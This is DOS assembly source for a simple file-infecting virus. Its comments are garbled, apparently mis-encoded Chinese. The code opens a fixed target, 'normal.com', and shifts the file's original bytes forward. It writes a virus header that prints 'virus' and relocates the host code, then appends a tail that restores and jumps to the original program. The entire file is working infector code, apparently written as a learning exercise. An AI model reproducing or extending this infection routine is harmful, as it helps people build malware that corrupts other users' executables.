org 100h
;����Ӵ˵�HdrVirusStart�Ǹ��Ƹ�Ⱦ���֣���Ⱦ���ǹ̶��ı�Ŀ¼�µ�normal.com�ļ�
;HdrVirusStart��HdrVirusEnd��ͷ���Ĳ������֣�EndVirusStart��EndVirusEnd��β���Ĳ�������

push bp
mov bp, sp
sub sp, LocalVarSize

;    open file
mov ax, 3d02h;ahΪ3d��ʾ���ļ���al=0ֻ����ʽ��1=ֻд��2=��д��ʽ
mov dx, FileName
int 21h
jnc Normal
mov ax, Fail
jmp ax
Normal:
mov [bp - pFileHd], ax; save filehandle�������ļ�����Ҫ��

;get file size
mov ax, 4202h;�����һ���ֽڿ�ʼƫ��
mov cx, 0  ;offset is cx:dx
mov dx, 0 
mov bx, [bp - pFileHd]
int 21h
mov [bp - pFileSize], ax

;������Ⱦ�ļ�����HdrVirusSize��С���Ա㽫ԭ�ļ����ݺ���HdrVirusSize
mov bx, [bp - pFileHd]
mov si, HdrVirusSize;��si����������ѭ����дsi���ֽڣ��Ӷ�����
_loop1:
; write file 
mov cx, 1;дһ���ֽ�
mov dx, Buf
mov ah, 40h
int 21h
dec si;��������������㣬�������β��дһ���ֽ�
jnz _loop1

;��ԭ�ļ�����HdrVirusSize

mov di, [bp - pFileSize]; set des offset
mov si, di;set src offset
dec si
mov [Count], di
add di, HdrVirusSize
dec di
mov bx, [bp - pFileHd];set file handle

_loop3
; read from old file
mov ax, 4200h;al=00��ͷ��ʼ����ƫ��
mov cx, 0  ;offset is cx:dx
mov dx, si
int 21h
mov cx, 1
mov dx, Buf
mov ah, 3fh
int 21h

; write to end
mov ax, 4200h;al=00��ͷ��ʼ����ƫ��
mov cx, 0  ;offset is cx:dx
mov dx, di
int 21h
mov cx, 1
mov dx, Buf
mov ah, 40h
int 21h

dec si
dec di
mov ax, [Count]
dec ax
mov [Count], ax
jnz _loop3

;������д��ͷ��
mov ax, 4200h;al=00��ͷ��ʼ����ƫ��
mov cx, 0  ;offset is cx:dx
mov dx, 0
int 21h
mov cx, HdrVirusSize
mov dx, HdrVirusStart
mov ah, 40h
int 21h

;��д����Ⱦ�ļ�ԭʼ����
mov ax, 4200h;al=00��ͷ��ʼ����ƫ��
mov cx, 0  ;offset is cx:dx
mov dx, HdrVirusSize - 2
int 21h
mov cx, 2
lea dx, [bp - pFileSize]
mov ah, 40h
int 21h

;������д��β��
mov ax, 4200h;al=00��ͷ��ʼ����ƫ��
mov cx, 0  ;offset is cx:dx
mov dx, [bp - pFileSize]
add dx, HdrVirusSize
int 21h
mov cx, EndVirusSize
mov dx, EndVirusStart
mov ah, 40h
int 21h


;  close file
mov ah, 3eh ;close file
int 21h
jmp end

Fail:
mov ax, FailToOpen
call StrLen

mov cx, ax
mov ax, FailToOpen
call DispStr

end:
add sp, LocalVarSize
pop bp
ret

HdrVirusStart: ;��������ͷ���Ĳ������뿪ʼ����
call AA
AA: pop bp
sub bp, AA
push bp
mov dl, 8
mov ax, Msg
add ax, bp
mov cx, 5
call DispStr
pop bp
mov si, HdrVirusEnd
add si, bp 
mov di, $$
mov bx, InfectedFileSize
add bx, bp
mov cx, [bx]
mov bx, cx
add bx, HdrVirusSize
add bx, $$
jmp bx
DispStr:
	mov	bp, ax			; ES:BP = ����ַ	
	mov	ax, 01301h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; ҳ��Ϊ0(BH = 0) �ڵ׺���(BL = 0Ch,����)	
	int	10h			; 10h ���ж�
	ret
Msg: db "virus"
InfectedFileSize: dw 0x0000

HdrVirusEnd:;��������ͷ���Ĳ�����������ڴ�


EndVirusStart:;��������β���Ĳ������뿪ʼ����

_loop2:
mov al, [si]
mov byte [di], al
inc si
inc di
dec cx
jnz _loop2
mov ax, $$;����ֱ��jmp $$��Ϊ�õ���offset����ͨ��ֲ����룬offset������
jmp ax

EndVirusEnd:;��������β���Ĳ�����������ڴ�	
	
StrLen:
  mov si, ax
  mov cx, ax  
_loop:  
  mov ax, [si]
  inc si
  test ax, ax
  jnz _loop
  dec si
  sub si, cx
  mov ax, si
  ret
  
FileName: db "normal.com", 0
FailToOpen: db "fail to open", 0
Buf: db 0
Count: dw 0000h
pFileHd equ 2
pFileSize equ pFileHd + 2 
LocalVarSize equ pFileSize
HdrVirusSize equ HdrVirusEnd - HdrVirusStart
EndVirusSize equ EndVirusEnd - EndVirusStart
VirusSize equ EndVirusSize + HdrVirusSize;�ܲ����Ĵ�С